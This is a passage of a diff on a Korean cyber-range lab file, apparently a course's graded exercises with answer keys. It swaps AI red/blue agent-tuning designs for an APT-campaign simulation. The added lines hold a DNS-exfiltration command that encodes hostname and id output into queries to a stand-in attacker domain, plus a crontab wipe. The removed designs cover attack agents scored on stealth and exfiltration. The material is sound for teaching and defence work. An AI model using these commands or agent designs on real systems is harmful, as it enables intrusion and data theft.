+  answer: cat /etc/hostname > /tmp/apt_staging.txt && id >> /tmp/apt_staging.txt && echo "=== DNS Exfiltration Attempt ===" && head -2 /tmp/apt_staging.txt | base64 | tr -d "\n" | head -c 50 | xargs -I{}
+    echo "nslookup {}.exfil.apt29.test.local" && echo "Exfiltration simulated (DNS queries not actually sent to external)"
+  answer_detail: 데이터 스테이징(T1074) 후 DNS 유출(T1048.001)을 시도한다. 시스템 정보를 수집하고 base64 인코딩하여 DNS 서브도메인으로 전송한다.
   verify:
     type: output_contains
-    expect: Adversarial Training
+    expect: DNS Exfiltration
   target_vm: attacker
-  script: "cat > /tmp/adversarial_training.txt << 'EOF'\n=== Adversarial Training Design ===\n\n1. Training Loop:\n   Epoch 1-10: Basic scenarios (known attacks vs known defenses)\n   Epoch 11-50: Red adapts\
-    \ to Blue's detection patterns\n   Epoch 51-100: Blue adapts to Red's evasion patterns\n   Epoch 100+: Both converge to Nash equilibrium\n\n2. Red Agent Evolution:\n   Gen 1: Script-kiddie (known exploits,\
-    \ default settings)\n   Gen 2: Tactical (encoded payloads, timing variation)\n   Gen 3: Strategic (multi-vector, LOLBins, mimicry)\n   Gen 4: Adaptive (real-time strategy adjustment)\n\n3. Blue Agent\
-    \ Evolution:\n   Gen 1: Signature-based (static rules)\n   Gen 2: Behavioral (baseline comparison)\n   Gen 3: Predictive (ML anomaly detection)\n   Gen 4: Proactive (threat hunting + deception)\n\n\
-    4. Nash Equilibrium:\n   - Both agents reach optimal mixed strategy\n   - Red: randomize attack vectors (unpredictable)\n   - Blue: multi-layered detection (comprehensive)\n   - No agent can unilaterally\
-    \ improve\n\n5. Training Infrastructure:\n   - Isolated network per episode\n   - Automated scoring and reward\n   - Episode replay for analysis\nEOF\ncat /tmp/adversarial_training.txt"
-  risk_level: low
+  script: cat /etc/hostname > /tmp/apt_staging.txt && id >> /tmp/apt_staging.txt && echo "=== DNS Exfiltration Attempt ===" && head -2 /tmp/apt_staging.txt | base64 | tr -d "\n" | head -c 50 | xargs -I{}
+    echo "nslookup {}.exfil.apt29.test.local" && echo "Exfiltration simulated (DNS queries not actually sent to external)"
+  risk_level: medium
 - order: 8
-  instruction: 에이전트 메모리 시스템을 설계하라. 에이전트가 과거 경험을 기억하고 활용하는 메모리 아키텍처를 구성하라.
-  hint: CCC의 memory_manager 패키지를 참고하여 전투 메모리를 설계한다.
-  category: analysis
-  points: 10
-  answer: "cat > /tmp/agent_memory_design.txt << 'EOF'\n=== Agent Memory Architecture ===\n\n1. Short-term Memory (current battle):\n   - Actions taken this round\n   - Detected defenses/vulnerabilities\n\
-    \   - Current access level\n   - Remaining tools/options\n   Capacity: 10 most recent events\n\n2. Working Memory (current session):\n   - Battle plan and progress\n   - Known network topology\n   -\
-    \ Discovered credentials\n   - Active C2 channels\n   Capacity: Full session state\n\n3. Long-term Memory (cross-session):\n   - Successful attack patterns (runbook)\n   - Failed approaches (avoid list)\n\
-    \   - Target system profiles\n   - Opponent behavior patterns\n   Capacity: 200 entries (LRU eviction)\n\n4. Episodic Memory (specific battles):\n   - Full battle replays\n   - Winning/losing strategies\n\
-    \   - Opponent adaptation patterns\n   Capacity: 50 most recent battles\n\nIntegration with memory_manager:\n  auto_extract_memories(project_id) → Extract battle learnings\n  enforce_capacity(max_task=200)\
-    \ → LRU capacity management\nEOF\ncat /tmp/agent_memory_design.txt"
-  answer_detail: 에이전트 메모리 아키텍처는 단기(현재 라운드), 작업(현재 세션), 장기(크로스 세션), 에피소드(특정 전투) 4계층으로 구성한다. memory_manager 패키지의 auto_extract_memories로 전투 후 학습 내용을 자동 추출하고, enforce_capacity로 LRU 관리한다.
-  verify:
-    type: output_contains
-    expect: Agent Memory Architecture
-  target_vm: attacker
-  script: "cat > /tmp/agent_memory_design.txt << 'EOF'\n=== Agent Memory Architecture ===\n\n1. Short-term Memory (current battle):\n   - Actions taken this round\n   - Detected defenses/vulnerabilities\n\
-    \   - Current access level\n   - Remaining tools/options\n   Capacity: 10 most recent events\n\n2. Working Memory (current session):\n   - Battle plan and progress\n   - Known network topology\n   -\
-    \ Discovered credentials\n   - Active C2 channels\n   Capacity: Full session state\n\n3. Long-term Memory (cross-session):\n   - Successful attack patterns (runbook)\n   - Failed approaches (avoid list)\n\
-    \   - Target system profiles\n   - Opponent behavior patterns\n   Capacity: 200 entries (LRU eviction)\n\n4. Episodic Memory (specific battles):\n   - Full battle replays\n   - Winning/losing strategies\n\
-    \   - Opponent adaptation patterns\n   Capacity: 50 most recent battles\n\nIntegration with memory_manager:\n  auto_extract_memories(project_id) → Extract battle learnings\n  enforce_capacity(max_task=200)\
-    \ → LRU capacity management\nEOF\ncat /tmp/agent_memory_design.txt"
-  risk_level: low
-- order: 9
-  instruction: 에이전트 성능 벤치마크를 설계하라. AI 에이전트의 성능을 정량적으로 측정하는 벤치마크 테스트를 구성하라.
-  hint: 표준화된 시나리오에서 에이전트 성능을 측정하는 테스트 스위트를 설계한다.
-  category: analysis
-  points: 10
-  answer: 'cat > /tmp/agent_benchmark.txt << ''EOF''
-
-    === AI Agent Performance Benchmark ===
-
-
-    Test Suite: 10 standardized scenarios
-
-
-    | # | Scenario | Difficulty | Time Limit | Pass Criteria |
-
-    |---|----------|-----------|------------|---------------|
-
-    | 1 | Port scan + service ID | Easy | 5 min | 80% services found |
-
-    | 2 | Web SQLi exploitation | Medium | 10 min | Admin access gained |
-
-    | 3 | SSH lateral movement | Medium | 10 min | 2nd host accessed |
-
-    | 4 | Persistence establishment | Medium | 5 min | Survives reboot |
-
-    | 5 | C2 beacon setup | Hard | 15 min | 5 min undetected |
-
-    | 6 | Data exfiltration | Hard | 15 min | >1KB extracted |
-
-    | 7 | Full kill chain | Hard | 30 min | Flag captured |
-
-    | 8 | Stealth operation | Hard | 30 min | 0 alerts triggered |
-
-    | 9 | Multi-target campaign | Expert | 45 min | 3 hosts compromised |
-
-    | 10 | Defend against APT | Expert | 45 min | Exfil prevented |
-
-
-    Scoring: Pass/Fail + Time + Stealth bonus
-
-    Ranking: ELO-style rating across agents
-
-    EOF
-
-    cat /tmp/agent_benchmark.txt'
-  answer_detail: 에이전트 벤치마크는 10개의 표준화된 시나리오에서 성능을 측정한다. Easy→Expert 난이도, 시간 제한, 명확한 합격 기준을 정의하여 객관적 비교가 가능하다. ELO 레이팅 시스템으로 에이전트 간 순위를 매기고 성능 추이를 추적한다.
-  verify:
-    type: output_contains
-    expect: Agent Performance Benchmark
-  target_vm: attacker
-  script: 'cat > /tmp/agent_benchmark.txt << ''EOF''
-
-    === AI Agent Performance Benchmark ===
-
-
-    Test Suite: 10 standardized scenarios
-
-
-    | # | Scenario | Difficulty | Time Limit | Pass Criteria |
-
-    |---|----------|-----------|------------|---------------|
-
-    | 1 | Port scan + service ID | Easy | 5 min | 80% services found |
-
-    | 2 | Web SQLi exploitation | Medium | 10 min | Admin access gained |
-
-    | 3 | SSH lateral movement | Medium | 10 min | 2nd host accessed |
-
-    | 4 | Persistence establishment | Medium | 5 min | Survives reboot |
-
-    | 5 | C2 beacon setup | Hard | 15 min | 5 min undetected |
-
-    | 6 | Data exfiltration | Hard | 15 min | >1KB extracted |
-
-    | 7 | Full kill chain | Hard | 30 min | Flag captured |
-
-    | 8 | Stealth operation | Hard | 30 min | 0 alerts triggered |
-
-    | 9 | Multi-target campaign | Expert | 45 min | 3 hosts compromised |
-
-    | 10 | Defend against APT | Expert | 45 min | Exfil prevented |
-
-
-    Scoring: Pass/Fail + Time + Stealth bonus
-
-    Ranking: ELO-style rating across agents
-
-    EOF
-
-    cat /tmp/agent_benchmark.txt'
-  risk_level: low
-- order: 10
-  instruction: 프롬프트 A/B 테스트를 설계하라. 두 가지 버전의 Red Agent 프롬프트를 비교 평가하는 실험을 설계하라.
-  hint: 통제 변수, 측정 지표, 통계적 유의성 검정 방법을 정의한다.
-  category: analysis
-  points: 10
-  answer: "cat > /tmp/prompt_ab_test.txt << 'EOF'\n=== Prompt A/B Test Design ===\n\n1. Hypothesis:\n   Structured output format (THINK/ACTION/OBSERVE/NEXT)\n   improves Red Agent success rate by >15%\n\
-    \n2. Test Setup:\n   Prompt A (Control): Free-form output\n   Prompt B (Treatment): Structured output format\n   Same LLM, same scenario, same target\n\n3. Variables:\n   Independent: Prompt structure\
-    \ (A vs B)\n   Dependent: Success rate, time to objective, stealth score\n   Controlled: LLM model, temperature, target, network state\n\n4. Sample Size:\n   n = 30 battles per prompt version (60 total)\n\
-    \   Power analysis: 80% power, alpha=0.05, effect=15%\n\n5. Metrics:\n   Primary: Mission success rate (%)\n   Secondary: Mean time to objective (seconds)\n   Tertiary: Stealth score (0-10)\n\n6. Statistical\
-    \ Test:\n   Chi-square for success rate (categorical)\n   Mann-Whitney U for time/stealth (non-normal)\n   p < 0.05 for significance\n\n7. Expected Result:\n   Prompt B (structured) → +20% success,\
-    \ -30% time\nEOF\ncat /tmp/prompt_ab_test.txt"
-  answer_detail: 프롬프트 A/B 테스트는 과학적 방법론으로 프롬프트 효과를 평가한다. 단일 변수(프롬프트 구조)만 변경하고 나머지를 통제하여, 구조화된 출력이 성공률에 미치는 영향을 통계적으로 검증한다. 30회 이상의 반복으로 통계적 유의성을 확보한다.
-  verify:
-    type: output_contains
-    expect: Prompt A/B Test
-  target_vm: attacker
-  script: "cat > /tmp/prompt_ab_test.txt << 'EOF'\n=== Prompt A/B Test Design ===\n\n1. Hypothesis:\n   Structured output format (THINK/ACTION/OBSERVE/NEXT)\n   improves Red Agent success rate by >15%\n\
-    \n2. Test Setup:\n   Prompt A (Control): Free-form output\n   Prompt B (Treatment): Structured output format\n   Same LLM, same scenario, same target\n\n3. Variables:\n   Independent: Prompt structure\
-    \ (A vs B)\n   Dependent: Success rate, time to objective, stealth score\n   Controlled: LLM model, temperature, target, network state\n\n4. Sample Size:\n   n = 30 battles per prompt version (60 total)\n\
-    \   Power analysis: 80% power, alpha=0.05, effect=15%\n\n5. Metrics:\n   Primary: Mission success rate (%)\n   Secondary: Mean time to objective (seconds)\n   Tertiary: Stealth score (0-10)\n\n6. Statistical\
-    \ Test:\n   Chi-square for success rate (categorical)\n   Mann-Whitney U for time/stealth (non-normal)\n   p < 0.05 for significance\n\n7. Expected Result:\n   Prompt B (structured) → +20% success,\
-    \ -30% time\nEOF\ncat /tmp/prompt_ab_test.txt"
-  risk_level: low
-- order: 11
-  instruction: 에이전트 앙상블 전략을 설계하라. 여러 LLM을 조합하여 에이전트 성능을 향상시키는 앙상블 아키텍처를 구상하라.
-  hint: 투표(voting), 체인(chaining), 전문화(specialization) 전략을 비교한다.
-  category: analysis
-  points: 10
-  answer: "cat > /tmp/ensemble_strategy.txt << 'EOF'\n=== Agent Ensemble Strategy ===\n\n1. Voting Ensemble:\n   - 3 LLMs independently analyze situation\n   - Majority vote decides action\n   - Reduces\
-    \ hallucination errors\n   Cost: 3x LLM calls, Benefit: +25% accuracy\n\n2. Chain Ensemble:\n   - LLM-A: Situation analysis\n   - LLM-B: Strategy planning (based on A's analysis)\n   - LLM-C: Action\
-    \ execution (based on B's plan)\n   Cost: 3x sequential calls, Benefit: +30% quality\n\n3. Specialization Ensemble:\n   - Recon Specialist: gemma3:12b (pattern recognition)\n   - Exploit Specialist:\
-    \ llama3.1:8b (code generation)\n   - Strategy Specialist: gpt-oss:120b (long-term planning)\n   - Router selects specialist per task\n   Cost: 1x call + routing, Benefit: +40% performance\n\n4. Recommendation:\n\
-    \   Use Specialization Ensemble for production\n   - Best performance/cost ratio\n   - Each model optimized for specific task\n   - Router adds minimal overhead\nEOF\ncat /tmp/ensemble_strategy.txt"
-  answer_detail: 앙상블 전략은 여러 LLM의 강점을 결합한다. 투표(다수결로 오류 감소), 체인(단계별 전문 처리), 전문화(태스크별 최적 모델 선택)의 3가지 접근법이 있다. 전문화 앙상블이 성능/비용 비율이 가장 우수하다.
-  verify:
-    type: output_contains
-    expect: Agent Ensemble Strategy
-  target_vm: attacker
-  script: "cat > /tmp/ensemble_strategy.txt << 'EOF'\n=== Agent Ensemble Strategy ===\n\n1. Voting Ensemble:\n   - 3 LLMs independently analyze situation\n   - Majority vote decides action\n   - Reduces\
-    \ hallucination errors\n   Cost: 3x LLM calls, Benefit: +25% accuracy\n\n2. Chain Ensemble:\n   - LLM-A: Situation analysis\n   - LLM-B: Strategy planning (based on A's analysis)\n   - LLM-C: Action\
-    \ execution (based on B's plan)\n   Cost: 3x sequential calls, Benefit: +30% quality\n\n3. Specialization Ensemble:\n   - Recon Specialist: gemma3:12b (pattern recognition)\n   - Exploit Specialist:\
-    \ llama3.1:8b (code generation)\n   - Strategy Specialist: gpt-oss:120b (long-term planning)\n   - Router selects specialist per task\n   Cost: 1x call + routing, Benefit: +40% performance\n\n4. Recommendation:\n\
-    \   Use Specialization Ensemble for production\n   - Best performance/cost ratio\n   - Each model optimized for specific task\n   - Router adds minimal overhead\nEOF\ncat /tmp/ensemble_strategy.txt"
-  risk_level: low
-- order: 12
-  instruction: 전략 최적화의 결과를 시뮬레이션하라. 최적화 전/후의 에이전트 성능을 비교하는 표를 작성하라.
-  hint: 성공률, 시간, 탐지율, 스코어의 전/후 비교를 작성한다.
-  category: analysis
-  points: 10
-  answer: 'cat > /tmp/optimization_results.txt << ''EOF''
-
-    === Agent Tuning Results ===
-
-
-    | Metric | Red Before | Red After | Blue Before | Blue After |
-
-    |--------|-----------|----------|------------|----------|
-
-    | Success Rate | 40% | 65% | 60% | 82% |
-
-    | Avg Time | 25 min | 12 min | N/A | N/A |
-
-    | Stealth | 5/10 | 8/10 | N/A | N/A |
-
-    | Detection Rate | N/A | N/A | 70% | 90% |
-
-    | False Positive | N/A | N/A | 15% | 4% |
-
-    | Response Time | N/A | N/A | 30s | 8s |
-
-    | Battle Score | 180/500 | 310/500 | 220/500 | 380/500 |
-
-
-    Key Improvements:
-
-    1. Structured prompts: +20% success rate (both agents)
-
-    2. Tool chain optimization: -50% operation time (Red)
-
-    3. Rule tuning: -73% false positive rate (Blue)
-
-    4. Memory system: +15% repeated scenario performance
-
-    5. RL integration: +10% strategy diversity
-
-
-    Overall: Both agents significantly improved, Blue maintains advantage
-
-    EOF
-
-    cat /tmp/optimization_results.txt'
-  answer_detail: 최적화 결과는 모든 핵심 지표에서 개선을 보인다. Red Agent는 성공률 +25%, 시간 -52%, 스텔스 +60% 향상. Blue Agent는 탐지율 +29%, 오탐 -73%, 응답시간 -73% 개선. 구조화된 프롬프트와 도구 최적화가 가장 큰 영향을 미쳤다.
-  verify:
-    type: output_contains
-    expect: Agent Tuning Results
-  target_vm: attacker
-  script: 'cat > /tmp/optimization_results.txt << ''EOF''
-
-    === Agent Tuning Results ===
-
-
-    | Metric | Red Before | Red After | Blue Before | Blue After |
-
-    |--------|-----------|----------|------------|----------|
-
-    | Success Rate | 40% | 65% | 60% | 82% |
-
-    | Avg Time | 25 min | 12 min | N/A | N/A |
-
-    | Stealth | 5/10 | 8/10 | N/A | N/A |
-
-    | Detection Rate | N/A | N/A | 70% | 90% |
-
-    | False Positive | N/A | N/A | 15% | 4% |
-
-    | Response Time | N/A | N/A | 30s | 8s |
-
-    | Battle Score | 180/500 | 310/500 | 220/500 | 380/500 |
-
-
-    Key Improvements:
-
-    1. Structured prompts: +20% success rate (both agents)
-
-    2. Tool chain optimization: -50% operation time (Red)
-
-    3. Rule tuning: -73% false positive rate (Blue)
-
-    4. Memory system: +15% repeated scenario performance
-
-    5. RL integration: +10% strategy diversity
-
-
-    Overall: Both agents significantly improved, Blue maintains advantage
-
-    EOF
-
-    cat /tmp/optimization_results.txt'
-  risk_level: low
-- order: 13
-  instruction: 에이전트 운영 대시보드를 설계하라. 실시간으로 에이전트 상태, 전투 진행, 성능 지표를 모니터링하는 대시보드의 구성요소를 정의하라.
-  hint: 실시간 전투 상태, 에이전트 메트릭, 히스토리를 포함한다.
-  category: analysis
-  points: 10
-  answer: "cat > /tmp/dashboard_design.txt << 'EOF'\n=== AI Battle Dashboard Design ===\n\nPanel 1: Battle Status (real-time)\n  - Current round number\n  - Red/Blue agent status (active/idle/blocked)\n\
-    \  - Live action feed (last 10 actions)\n  - Score: Red XXX / Blue XXX\n\nPanel 2: Network Map (topology)\n  - Nodes: servers with status (clean/compromised/defended)\n  - Edges: attack paths (red)\
-    \ / defense actions (blue)\n  - Real-time update on agent actions\n\nPanel 3: Agent Metrics (time series)\n  - Success rate (rolling 10 battles)\n  - Average response time\n  - Tool usage distribution\n\
-    \  - Strategy diversity index\n\nPanel 4: MITRE ATT&CK Heat Map\n  - Techniques attempted (red)\n  - Techniques detected (blue)\n  - Coverage gaps (yellow)\n\nPanel 5: RL Training Progress\n  - Q-value\
-    \ convergence chart\n  - Episode reward trend\n  - Exploration vs exploitation ratio\n\nData Source: CCC Manager API + PoW blocks\nRefresh Rate: 5 seconds\nEOF\ncat /tmp/dashboard_design.txt"
-  answer_detail: '공방전 대시보드는 5개 패널로 구성한다: (1) 실시간 전투 상태, (2) 네트워크 토폴로지 맵, (3) 에이전트 성능 지표 시계열, (4) ATT&CK 히트맵, (5) RL 학습 진행. CCC Manager API와 PoW 블록 데이터를 5초 간격으로 갱신한다.'
-  verify:
-    type: output_contains
-    expect: AI Battle Dashboard
-  target_vm: attacker
-  script: "cat > /tmp/dashboard_design.txt << 'EOF'\n=== AI Battle Dashboard Design ===\n\nPanel 1: Battle Status (real-time)\n  - Current round number\n  - Red/Blue agent status (active/idle/blocked)\n\
-    \  - Live action feed (last 10 actions)\n  - Score: Red XXX / Blue XXX\n\nPanel 2: Network Map (topology)\n  - Nodes: servers with status (clean/compromised/defended)\n  - Edges: attack paths (red)\
-    \ / defense actions (blue)\n  - Real-time update on agent actions\n\nPanel 3: Agent Metrics (time series)\n  - Success rate (rolling 10 battles)\n  - Average response time\n  - Tool usage distribution\n\
-    \  - Strategy diversity index\n\nPanel 4: MITRE ATT&CK Heat Map\n  - Techniques attempted (red)\n  - Techniques detected (blue)\n  - Coverage gaps (yellow)\n\nPanel 5: RL Training Progress\n  - Q-value\
-    \ convergence chart\n  - Episode reward trend\n  - Exploration vs exploitation ratio\n\nData Source: CCC Manager API + PoW blocks\nRefresh Rate: 5 seconds\nEOF\ncat /tmp/dashboard_design.txt"
-  risk_level: low
-- order: 14
-  instruction: 실습 환경을 정리하라. 이번 주 생성된 모든 파일을 삭제하라.
-  hint: rm으로 /tmp 내 관련 파일을 삭제한다.
-  category: response
-  points: 5
-  answer: rm -f /tmp/red_prompt_*.txt /tmp/blue_prompt_*.txt /tmp/tool_chain_*.txt /tmp/rl_strategy_*.txt /tmp/learning_data_*.txt /tmp/rule_tuning_*.txt /tmp/adversarial_*.txt /tmp/agent_memory_*.txt /tmp/agent_benchmark_*.txt
-    /tmp/prompt_ab_*.txt /tmp/ensemble_*.txt /tmp/optimization_*.txt /tmp/dashboard_*.txt 2>/dev/null; echo 'Agent tuning lab cleanup completed'
-  answer_detail: 실습 환경 정리에서는 프롬프트, 전략, RL, 벤치마크, 대시보드 설계 파일을 모두 삭제한다.
-  verify:
-    type: output_contains
-    expect: cleanup completed
-  target_vm: attacker
-  script: rm -f /tmp/red_prompt_*.txt /tmp/blue_prompt_*.txt /tmp/tool_chain_*.txt /tmp/rl_strategy_*.txt /tmp/learning_data_*.txt /tmp/rule_tuning_*.txt /tmp/adversarial_*.txt /tmp/agent_memory_*.txt /tmp/agent_benchmark_*.txt
-    /tmp/prompt_ab_*.txt /tmp/ensemble_*.txt /tmp/optimization_*.txt /tmp/dashboard_*.txt 2>/dev/null; echo 'Agent tuning lab cleanup completed'
-  risk_level: low
-- order: 15
-  instruction: 에이전트 튜닝 실습의 종합 보고서를 작성하라. 최적화 방법, 결과, 향후 연구 방향을 포함하라.
-  hint: 프롬프트/도구/RL/앙상블 최적화의 효과와 한계를 정리한다.
+  instruction: '[RED/BLUE] APT 캠페인 환경을 정리하고 킬체인 분석 보고서를 작성하라. 공격 타임라인, 탐지 커버리지, Gap, 개선 권고를 포함하라.'
+  hint: crontab을 제거하고, 각 단계의 탐지 성공/실패를 정리한다.
   category: analysis
   points: 15
-  answer: "cat > /tmp/tuning_report.txt << 'EOF'\n=== AI Agent Tuning Report ===\nDate: 2026-04-03\n\n1. Optimization Methods Applied:\n   - Prompt engineering: Structured output, clear constraints\n  \
-    \ - Tool chain: Targeted scanning, efficient sequencing\n   - Detection tuning: Threshold adjustment, FP reduction\n   - RL integration: Q-learning for strategy selection\n   - Memory system: Cross-session\
-    \ learning\n   - Ensemble: Specialization-based model selection\n\n2. Results Summary:\n   Red Agent: +62% battle score improvement\n   Blue Agent: +73% battle score improvement\n   Overall: Both agents\
-    \ converging to higher capability\n\n3. Key Findings:\n   - Structured prompts have the highest ROI\n   - RL requires 100+ episodes to show benefit\n   - Ensemble adds latency but improves accuracy\n\
-    \   - Memory system prevents strategy repetition\n\n4. Future Research:\n   - Fine-tuned security-specific LLMs\n   - Multi-agent cooperative strategies\n   - Transfer learning across different networks\n\
-    \   - Automated prompt optimization (DSPy)\n   - Real-time adversarial training loop\nEOF\ncat /tmp/tuning_report.txt"
-  answer_detail: 에이전트 튜닝 보고서는 적용한 최적화 방법(프롬프트, 도구, 탐지, RL, 메모리, 앙상블), 정량적 결과(Red +62%, Blue +73%), 핵심 인사이트, 향후 연구 방향을 포함한다. 구조화된 프롬프트가 가장 높은 ROI를 보였고, RL은 충분한 에피소드가 필요하다.
+  answer: 'crontab -r 2>/dev/null; rm -f /tmp/apt_campaign_*.elf /tmp/apt_campaign_*.xml /tmp/apt_staging.txt /tmp/apt_beacon.txt 2>/dev/null && cat > /tmp/apt_campaign_report.txt << ''EOF'' === APT Campaign
+    Simulation Report === Date: 2026-04-06 | Scope: 10.20.30.0/24
+
+    Kill Chain Timeline: [T+00] Recon: Slow SYN scan + NSE scripts (T1595) [T+15] Weaponization: msfvenom ELF payload (T1587) [T+20] Exploitation: SQL Injection on JuiceShop (T1190) [T+30] Persistence:
+    Crontab beacon (T1053.003) [T+35] Lateral: SSH to secu + siem servers (T1021.004) [T+45] Exfiltration: DNS tunneling attempt (T1048.001)
+
+    Detection Coverage: | Stage | Detected | Tool | Gap | |-------|----------|------|-----| | Recon | YES | Suricata | Slow scan partial | | Exploit | YES | WAF+Suricata | None | | Persist | PARTIAL | auth.log
+    | No FIM on crontab | | Lateral | PARTIAL | auth.log | No correlation | | Exfil | NO | - | No DNS monitoring |
+
+    Overall: 2.5/5 stages detected (50%)
+
+    Improvements Deployed: - APT campaign correlation rule (Wazuh 100400) - Slow scan detection (Suricata 5000010) - Active Response auto-isolation
+
+    Recommendations: 1. Deploy FIM on /var/spool/cron 2. Add SSH lateral movement correlation 3. Implement DNS entropy monitoring 4. Conduct monthly APT simulations EOF cat /tmp/apt_campaign_report.txt'
+  answer_detail: APT 캠페인 보고서는 킬체인 타임라인, 단계별 탐지 커버리지(50%), 배포된 개선 사항, 잔여 Gap, 권고사항을 포함한다.
   verify:
     type: output_contains
-    expect: AI Agent Tuning Report
+    expect: APT Campaign Simulation
   target_vm: attacker
-  script: "cat > /tmp/tuning_report.txt << 'EOF'\n=== AI Agent Tuning Report ===\nDate: 2026-04-03\n\n1. Optimization Methods Applied:\n   - Prompt engineering: Structured output, clear constraints\n  \
-    \ - Tool chain: Targeted scanning, efficient sequencing\n   - Detection tuning: Threshold adjustment, FP reduction\n   - RL integration: Q-learning for strategy selection\n   - Memory system: Cross-session\
-    \ learning\n   - Ensemble: Specialization-based model selection\n\n2. Results Summary:\n   Red Agent: +62% battle score improvement\n   Blue Agent: +73% battle score improvement\n   Overall: Both agents\
-    \ converging to higher capability\n\n3. Key Findings:\n   - Structured prompts have the highest ROI\n   - RL requires 100+ episodes to show benefit\n   - Ensemble adds latency but improves accuracy\n\
-    \   - Memory system prevents strategy repetition\n\n4. Future Research:\n   - Fine-tuned security-specific LLMs\n   - Multi-agent cooperative strategies\n   - Transfer learning across different networks\n\
-    \   - Automated prompt optimization (DSPy)\n   - Real-time adversarial training loop\nEOF\ncat /tmp/tuning_report.txt"
+  script: 'crontab -r 2>/dev/null; rm -f /tmp/apt_campaign_*.elf /tmp/apt_campaign_*.xml /tmp/apt_staging.txt /tmp/apt_beacon.txt 2>/dev/null && cat > /tmp/apt_campaign_report.txt << ''EOF'' === APT Campaign
+    Simulation Report === Date: 2026-04-06 | Scope: 10.20.30.0/24
+
+    Kill Chain Timeline: [T+00] Recon: Slow SYN scan + NSE scripts (T1595) [T+15] Weaponization: msfvenom ELF payload (T1587) [T+20] Exploitation: SQL Injection on JuiceShop (T1190) [T+30] Persistence:
+    Crontab beacon (T1053.003) [T+35] Lateral: SSH to secu + siem servers (T1021.004) [T+45] Exfiltration: DNS tunneling attempt (T1048.001)
+
+    Detection Coverage: | Stage | Detected | Tool | Gap | |-------|----------|------|-----| | Recon | YES | Suricata | Slow scan partial | | Exploit | YES | WAF+Suricata | None | | Persist | PARTIAL | auth.log
+    | No FIM on crontab | | Lateral | PARTIAL | auth.log | No correlation | | Exfil | NO | - | No DNS monitoring |
+
+    Overall: 2.5/5 stages detected (50%)
+
+    Improvements Deployed: - APT campaign correlation rule (Wazuh 100400) - Slow scan detection (Suricata 5000010) - Active Response auto-isolation
+
+    Recommendations: 1. Deploy FIM on /var/spool/cron 2. Add SSH lateral movement correlation 3. Implement DNS entropy monitoring 4. Conduct monthly APT simulations EOF cat /tmp/apt_campaign_report.txt'
   risk_level: low
